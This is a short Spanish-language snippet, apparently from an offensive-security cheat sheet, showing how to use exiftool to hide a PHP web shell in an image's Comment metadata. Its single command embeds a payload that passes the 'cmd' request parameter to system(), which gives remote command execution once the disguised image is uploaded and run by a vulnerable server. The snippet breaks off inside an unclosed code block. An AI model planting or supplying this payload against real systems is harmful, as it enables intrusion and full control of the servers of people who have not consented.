### Exiftool

#### Incluir PHP en imagen
Lo primero que necesitamos es la imagen que vamos a utilizar para cargar la Shell. Una vez descargada, comenzamos a modificarla.

El comando para ello es:
```bash
exiftool -Comment='<?php echo “<pre>”; system($_GET[‘cmd’]); ?>’ nombre_imagen.extensión
